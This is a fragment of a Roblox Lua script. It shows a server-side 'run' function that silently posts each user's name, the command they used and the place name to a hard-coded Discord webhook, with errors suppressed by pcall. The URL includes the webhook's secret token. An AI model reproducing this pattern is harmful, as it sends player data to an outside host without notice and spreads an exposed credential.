...
function run(commandName, command,user)
	if game:GetService('RunService'):IsServer() then
		local commandName = (commandName or "none"):lower()
		pcall(function()
			local msg = {content = ("==========================\n**User:** %s\n**Command:** %s\n**Place:** %s"):format(user.Name,command, game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)}
			game:GetService('HttpService'):PostAsync("https://canary.discordapp.com/api/webhooks/714535496134426767/vw10hlVShqDUQa8rsoskuOpbCt0E88kn-iWiZ3lMm7aOatX6OpBCI8mbYizfr-WwFFkQ ",game:GetService('HttpService'):JSONEncode(msg))
		end)
	end
end
